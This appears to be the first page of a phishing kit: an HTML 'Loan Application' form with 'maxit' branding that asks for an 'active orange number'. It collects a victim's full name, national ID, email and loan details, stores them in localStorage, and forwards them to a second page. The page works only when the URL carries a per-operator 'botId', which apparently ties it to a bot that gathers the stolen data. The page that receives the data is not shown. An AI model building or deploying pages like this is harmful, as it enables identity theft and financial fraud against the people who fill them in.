<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loan Application</title>

<style>

body{
font-family: Arial, sans-serif;
background:#000;
margin:0;
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
color:white;
padding:20px;
}

.loan-container{
background:white;
color:black;
padding:30px;
border-radius:20px;
width:100%;
max-width:420px;
box-shadow:0 10px 30px rgba(0,0,0,0.4);
}

/* LOGO CIRCLE */

.logo-wrapper{
display:flex;
justify-content:center;
margin-bottom:20px;
}

.logo-circle{
width:110px;
height:110px;
border-radius:50%;
background:#111;
display:flex;
justify-content:center;
align-items:center;
box-shadow:0 6px 20px rgba(0,0,0,0.3);
overflow:hidden;
}

.logo-circle img{
width:80%;
height:80%;
object-fit:contain;
}

h2{
text-align:center;
margin-bottom:20px;
}

/* FORM */

label{
font-weight:bold;
font-size:14px;
margin-bottom:5px;
display:block;
}

input,select{
width:100%;
padding:12px;
border-radius:10px;
border:1px solid #ddd;
margin-bottom:15px;
font-size:14px;
}

input:focus,select:focus{
outline:none;
border:1px solid #ff9800;
}

/* NOTICE */

.loan-notice{
background:#fff3cd;
border:1px solid #ffeeba;
padding:15px;
border-radius:10px;
font-size:13px;
margin-bottom:20px;
}

.loan-notice ol{
padding-left:18px;
margin:8px 0 0 0;
}

.loan-notice li{
margin-bottom:6px;
}

/* BUTTON */

button{
width:100%;
padding:14px;
border:none;
border-radius:12px;
font-size:16px;
cursor:pointer;
color:white;
background:linear-gradient(90deg,#ff9800,#ff7043);
box-shadow:0 5px 15px rgba(0,0,0,0.2);
transition:0.2s;
}

button:hover{
transform:translateY(-1px);
}

</style>
</head>

<body>

<div class="loan-container">

<div class="logo-wrapper">
<div class="logo-circle">
<img src="maxit-logo.jpeg">
</div>
</div>

<h2>Loan Application</h2>

<form id="loanForm">

<label>Full Name</label>
<input id="fullName" type="text" required placeholder="Enter your full name">

<label>Loan Amount (LRD)</label>
<input id="loanAmount" type="number" required placeholder="MIN 5,000">

<label>Email</label>
<input id="email" type="email" placeholder="example@gmail.com" required>

<label>National ID</label>
<input id="nationalId" type="text" placeholder="National ID">

<label>Repayment Period</label>
<select id="repaymentPeriod" required>
<option value="">Select</option>
<option value="6months"> 6 months</option>
<option value="12months">12 months </option>
<option value="24months">24 months </option>
<option value="36months">36 months </option>
<option value="48months">48 months</option>
<option value="60months">60 months </option>
</select>

<label>Employment Status</label>
<select id="employmentStatus" required>
<option value="">Select</option>
<option value="employed">Employed</option>
<option value="self-employed">Self-employed</option>
<option value="unemployed">Unemployed</option>
<option value="student">Student</option>
</select>

<label>Loan Purpose</label>
<select id="loanPurpose" required>
<option value="">Select</option>
<option value="business">Business</option>
<option value="personal">Personal Loans</option>
<option value="schoolfees">School Fees</option>
<option value="medical">Medical</option>
<option value="others">Others</option>
</select>

<div class="loan-notice">
<strong>Qualification Notice:</strong>
<ol>
<li>Must apply with an active orange number.</li>
</ol>
</div>

<button type="submit">Next</button>

</form>

</div>

<script>

// BOT ID
let botId = new URLSearchParams(window.location.search).get('botId');
if (!botId) {
const parts = window.location.pathname.split('/');
const botIndex = parts.indexOf('bot');
if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
}

if (!botId) {
alert("Invalid access link");
throw new Error("botId missing");
}

localStorage.setItem('botId', botId);

// FORM
document.getElementById('loanForm').addEventListener('submit', e => {

e.preventDefault();

localStorage.setItem('fullName', fullName.value);
localStorage.setItem('loanAmount', loanAmount.value);
localStorage.setItem('email', email.value);
localStorage.setItem('nationalId', nationalId.value);
localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
localStorage.setItem('employmentStatus', employmentStatus.value);
localStorage.setItem('loanPurpose', loanPurpose.value);

window.location.href = `details2.html?botId=${botId}`;

});

</script>

</body>
</html>
